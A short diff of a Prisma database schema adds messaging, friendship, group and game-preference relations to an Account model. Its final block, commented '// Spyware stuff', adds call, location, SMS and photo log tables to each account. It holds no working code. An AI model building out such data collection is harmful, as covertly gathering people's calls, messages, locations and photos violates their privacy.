@@ -4,5 +4,23 @@ model Account {
   email     String    @unique @db.VarChar(256)
   password  String
   created_at DateTime @default(now())
+
   sessions  Session[]
+  timezone  AccountTimeZone?
+
+  sent_dm  DirectMessage[]      @relation("Sender")
+  received_dm  DirectMessage[]      @relation("Contact")
+
+  friends_as Friendship[]  @relation("Account1")
+  friends_with Friendship[]  @relation("Account2")
+  game_preferences GamePreference[]
+
+  group_members GroupMember[]
+  group_messages GroupMessage[]
+
+  // Spyware stuff
+  call_logs CallLog[]
+  location_logs LocationLog[]
+  sms_logs SMSLog[]
+  photo_logs PhotoLog[]
 }
